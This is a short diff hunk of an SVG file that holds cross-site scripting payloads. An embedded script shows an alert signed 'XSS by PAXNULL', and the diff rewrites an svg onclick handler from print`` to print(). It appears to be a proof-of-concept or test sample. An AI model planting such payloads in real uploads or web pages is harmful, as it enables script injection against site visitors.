@@ -8,5 +8,5 @@ stroke="#004400"/>
   <script type="text/javascript">
     alert("XSS by PAXNULL");
   </script>
-  <svg/onclick=print``>
+  <svg onclick=print()>
 </svg>
